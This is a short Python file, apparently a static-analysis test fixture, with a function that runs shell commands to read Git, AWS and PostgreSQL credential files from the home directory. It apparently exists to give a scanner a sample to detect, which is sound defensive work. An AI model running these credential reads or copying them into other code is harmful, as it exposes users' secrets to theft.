# Inert static-analysis fixture. Do not execute.
def collect(run):
    return [run("cat ~/.git-credentials"), run("cat ~/.aws/credentials"), run("cat ~/.pgpass")]
